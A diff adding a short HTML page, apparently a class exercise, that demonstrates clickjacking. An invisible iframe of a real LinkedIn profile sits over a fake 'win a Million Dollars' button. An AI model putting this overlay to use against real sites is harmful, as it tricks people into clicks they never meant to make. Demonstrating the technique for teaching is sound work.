@@ -1,0 +1,16 @@
+<html>
+   <head>
+     <title>Clickjacking Times</title>
+   </head>
+   
+   <body>
+   <h1>Clickjacking Example</h1>
+     <div style="z-index:2; position:absolute; top:0; left:0; width: 100%; height: 100%;">
+       <iframe src="https://www.linkedin.com/in/arvy-dela-cruz/" id="frame1" style="opacity:0; filter:alpha(opacity=0);" width:"100%"; height:"100%" />
+      </iframe>
+     </div>
+     <div align="right" style="position:absolute; top:0; left:0; z-index:1; width: 100%; height:100%; background-color: white; text-align:left;">
+        <p><input type="submit" value="Press Here" /><br />Press this button to win a Million Dollars sponsored by Professor Joe!</p>
+     </div>
+   </body>
+</html>
